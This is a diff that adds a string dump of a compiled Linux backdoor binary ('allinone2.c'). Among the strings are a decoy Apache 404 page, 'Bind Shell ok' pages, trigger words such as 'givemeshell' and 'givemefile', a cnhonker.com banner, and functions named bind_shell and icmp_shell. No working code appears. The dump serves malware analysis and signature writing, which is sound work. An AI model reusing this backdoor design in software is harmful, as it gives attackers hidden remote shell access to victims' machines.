@@ -1,0 +1,480 @@
+/lib/ld-linux.so.2
+libpthread.so.0
+waitpid
+recv
+connect
+pthread_create
+system
+recvfrom
+accept
+write
+fork
+sigaction
+__errno_location
+_Jv_RegisterClasses
+libc.so.6
+strcpy
+printf
+sysconf
+getprotobyname
+getpid
+memcpy
+execl
+dup2
+feof
+remove
+socket
+select
+putenv
+bzero
+alarm
+bind
+chdir
+umask
+strstr
+setgid
+signal
+setpgrp
+strncpy
+htonl
+listen
+fread
+memset
+seteuid
+strcmp
+gethostbyname
+fclose
+scanf
+htons
+exit
+fopen
+atoi
+_IO_stdin_used
+__libc_start_main
+strlen
+setsid
+setegid
+setuid
+__gmon_start__
+GLIBC_2.1
+GLIBC_2.0
+PTRh
+QVh0
+RDFpassword
+[su]       
+[login]       
+[bash]       
+/dev/null
+children %d died
+Content-type: text/html
+HTTP/1.1 404 Not Found
+Date: Mon, 14 Jan 2002 03:19:55 GMT
+Server: Apache/1.3.22 (Unix)
+Connection: close
+Content-Type: text/html
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 4.0//EN">
+<HTML><HEAD>
+<TITLE>404 Not Found</TITLE>
+</HEAD><BODY>
+<H1>Not Found</H1>
+The requested URL was not found on this server.<P>
+<HR>
+<ADDRESS>Apache/1.3.22 Server at localhost Port 8008</ADDRESS>
+</BODY></HTML>
+Content-type: text/html
+<html>
+<head><title>Bind Shell ok.:)</title></head>
+<body bgcolor="#000000">
+<div align="center"><p>
+<font face="Arial" color="#999999" size="7"><b>
+You get it, goodluck! :-)
+</b></font></p></div><br>
+</body></html>
+Content-type: text/html
+<html>
+<head><title>Tran ok.:)</title></head>
+<body bgcolor="#000000">
+<div align="center"><p>
+<font face="Arial" color="#999999" size="7"><b>
+Tran ok!
+</b></font></p></div><br>
+</body></html>
+Content-type: text/html
+<html>
+<head><title>Shell ok.:)</title></head>
+<body bgcolor="#000000">
+<div align="left">
+<pre><font face="Arial" color="#999999" size="2">
+</font></pre></div><br>
+</body></html>
+<b>Your Command:</b>
+<br>
+/tmp/tmp.txt
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:.
+kissme:)
+bindport
+socks
+givemeshell
+HTTP
+givemefile
+Enter Your password: 
+========Welcome to http://www.cnhonker.com========
+==========You got it, have a goodluck. :)=========
+Your command: 
+/bin/sh
+icmp
+Enter Password: 
+Password accepted!
+You entered an Incorrect Password.  Exiting...
+=======================================================
+GCC: (GNU) 3.2 20020903 (Red Hat Linux 8.0 3.2-7)
+GCC: (GNU) 3.2 20020903 (Red Hat Linux 8.0 3.2-7)
+GCC: (GNU) 3.2 20020903 (Red Hat Linux 8.0 3.2-7)
+GCC: (GNU) 3.2 20020903 (Red Hat Linux 8.0 3.2-7)
+GCC: (GNU) 3.2 20020903 (Red Hat Linux 8.0 3.2-7)
+GCC: (GNU) 3.2 20020903 (Red Hat Linux 8.0 3.2-7)
+_IO_stdin_used
+/usr/src/build/148620-i386/BUILD/glibc-2.2.93/csu
+GNU AS 2.13.90.0.2
+/usr/src/build/148620-i386/BUILD/glibc-2.2.93/csu
+GNU AS 2.13.90.0.2
+init.c
+../sysdeps/unix/sysv/linux/bits/types.h
+../sysdeps/unix/sysv/linux/bits/sched.h
+../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h
+../wcsmbs/wchar.h
+../sysdeps/gnu/_G_config.h
+../iconv/gconv.h
+/usr/lib/gcc-lib/i386-redhat-linux/3.2/include/stddef.h
+/tmp/ccnhFcil.s
+dd,,-:
+/tmp/ccqfJNVk.s
+_G_int32_t
+__time_t
+__rw_kind
+__daddr_t
+__int32_t
+__gconv_init_fct
+_G_iconv_t
+__stackaddr_set
+__rlim64_t
+pthread_mutex_t
+__GCONV_ILLEGAL_DESCRIPTOR
+__gconv_info
+__rw_readers
+unsigned char
+__stacksize
+__useconds_t
+__counter
+_pthread_descr
+__fct
+__val
+__value
+__schedparam
+__nsteps
+_G_int16_t
+__max_needed_from
+pthread_condattr_t
+__off_t
+__ssize_t
+__blksize_t
+__statep
+init.c
+__fsfilcnt_t
+__steps
+__fsfilcnt64_t
+__status
+__blkcnt_t
+__gconv_loaded_object
+short unsigned int
+_G_fpos64_t
+__gconv_t
+__trans_end_fct
+__rw_writer
+__m_lock
+pthread_cond_t
+__u_int
+__GCONV_ILLEGAL_INPUT
+__lockkind
+__to_name
+__end_fct
+__uint64_t
+__t_scalar_t
+__id_t
+__rw_lock
+__pthread_attr_s
+__cd
+__pshared
+__ino_t
+__dummy
+__GCONV_NOCONV
+__invocation_counter
+__pid_t
+__u_short
+__count
+__quad_t
+__inheritsched
+__fsid_t
+__rw_write_waiting
+__GCONV_FULL_OUTPUT
+__max_needed_to
+__timer_t
+__stateful
+__uint32_t
+pthread_barrier_t
+__key_t
+__u_char
+__gconv_step
+__m_count
+__min_needed_to
+__u_long
+short int
+__dev_t
+long long int
+__gconv_trans_data
+pthread_t
+__outbuf
+long long unsigned int
+__uid_t
+__wchb
+__uint16_t
+pthread_barrierattr_t
+wint_t
+_pthread_descr_struct
+__u_quad_t
+__ipc_pid_t
+__sched_priority
+pthread_once_t
+__m_reserved
+__gconv_trans_end_fct
+__flags
+__outbufend
+__combined
+__gconv_trans_init_fct
+__init_fct
+__modname
+__trans_context_fct
+__trans_fct
+__rlim_t
+__wch
+__shlib_handle
+__c_waiting
+__intptr_t
+__suseconds_t
+__ino64_t
+wchar_t
+__GCONV_EMPTY_INPUT
+/usr/src/build/148620-i386/BUILD/glibc-2.2.93/csu
+pthread_spinlock_t
+__GCONV_IS_LAST
+__blkcnt64_t
+__fsblkcnt64_t
+__mode_t
+pthread_mutexattr_t
+__guardsize
+__qaddr_t
+__pos
+__gconv_end_fct
+__spinlock
+_IO_stdin_used
+__ba_required
+__GCONV_INCOMPLETE_INPUT
+__c_lock
+__internal_use
+__GCONV_NODB
+__clock_t
+pthread_key_t
+__gconv_step_data
+__gconv_trans_query_fct
+__detachstate
+__socklen_t
+__int64_t
+__ba_present
+pthread_rwlockattr_t
+__m_owner
+__GCONV_NOMEM
+__off64_t
+_G_fpos_t
+__ba_lock
+__int8_t
+__GCONV_OK
+__fsblkcnt_t
+_G_uint32_t
+__nlink_t
+__swblk_t
+__sched_param
+__GCONV_INTERNAL_ERROR
+__ba_waiting
+__scope
+__mbstate_t
+__rw_pshared
+__gid_t
+__stackaddr
+__clockid_t
+__state
+__t_uscalar_t
+__gconv_trans_context_fct
+__next
+__GCONV_IGNORE_ERRORS
+_pthread_fastlock
+__schedpolicy
+__trans
+__uint8_t
+__gconv_fct
+__from_name
+__min_needed_from
+__gconv_trans_fct
+__m_kind
+__data
+pthread_attr_t
+__caddr_t
+_G_uint16_t
+__loff_t
+GNU C 3.2 20020903 (Red Hat Linux 8.0 3.2-7)
+__rw_read_waiting
+_pthread_rwlock_t
+__mutexkind
+__int16_t
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rel.dyn
+.rel.plt
+.init
+.text
+.fini
+.rodata
+.data
+.eh_frame
+.dynamic
+.ctors
+.dtors
+.jcr
+.got
+.bss
+.comment
+.debug_aranges
+.debug_pubnames
+.debug_info
+.debug_abbrev
+.debug_line
+.debug_frame
+.debug_str
+init.c
+initfini.c
+call_gmon_start
+crtstuff.c
+__CTOR_LIST__
+__DTOR_LIST__
+__EH_FRAME_BEGIN__
+__JCR_LIST__
+completed.1
+__do_global_dtors_aux
+frame_dummy
+__CTOR_END__
+__DTOR_END__
+__FRAME_END__
+__JCR_END__
+__do_global_ctors_aux
+allinone2.c
+__dso_handle
+stored_password
+client_connect
+sigaction@@GLIBC_2.0
+execl@@GLIBC_2.0
+setpgrp@@GLIBC_2.0
+feof@@GLIBC_2.0
+getpid@@GLIBC_2.0
+_DYNAMIC
+quit
+out2in
+get_shell
+write@@GLIBC_2.0
+recvfrom@@GLIBC_2.0
+strcmp@@GLIBC_2.0
+close@@GLIBC_2.0
+_fp_hw
+TCP_listen
+fork@@GLIBC_2.0
+umask@@GLIBC_2.0
+signal@@GLIBC_2.0
+unescape_url
+seteuid@@GLIBC_2.0
+pthread_create@@GLIBC_2.1
+select@@GLIBC_2.0
+htonl@@GLIBC_2.0
+create_serv
+putenv@@GLIBC_2.0
+__errno_location@@GLIBC_2.0
+setgid@@GLIBC_2.0
+create_socket
+accept@@GLIBC_2.0
+system@@GLIBC_2.0
+_init
+listen@@GLIBC_2.0
+setsid@@GLIBC_2.0
+scanf@@GLIBC_2.0
+fread@@GLIBC_2.0
+socks
+remove@@GLIBC_2.0
+ret_buf
+daemon_init
+sysconf@@GLIBC_2.0
+getprotobyname@@GLIBC_2.0
+waitpid@@GLIBC_2.0
+setegid@@GLIBC_2.0
+_start
+icmp_shell
+read_file
+chdir@@GLIBC_2.0
+strstr@@GLIBC_2.0
+strlen@@GLIBC_2.0
+bind_shell
+__bss_start
+main
+outfd
+__libc_start_main@@GLIBC_2.0
+sig_chid
+dup2@@GLIBC_2.0
+data_start
+printf@@GLIBC_2.0
+bind@@GLIBC_2.0
+_fini
+memcpy@@GLIBC_2.0
+fclose@@GLIBC_2.1
+open@@GLIBC_2.0
+gethostbyname@@GLIBC_2.0
+writen_file
+bzero@@GLIBC_2.0
+string_to_print
+exit@@GLIBC_2.0
+atoi@@GLIBC_2.0
+_edata
+_GLOBAL_OFFSET_TABLE_
+_end
+htons@@GLIBC_2.0
+memset@@GLIBC_2.0
+connect@@GLIBC_2.0
+maxfd
+strncpy@@GLIBC_2.0
+get_password
+fopen@@GLIBC_2.1
+dup@@GLIBC_2.0
+_IO_stdin_used
+recv@@GLIBC_2.0
+infd
+__data_start
+socket@@GLIBC_2.0
+_Jv_RegisterClasses
+setuid@@GLIBC_2.0
+alarm@@GLIBC_2.0
+plustospace
+__gmon_start__
+strcpy@@GLIBC_2.0
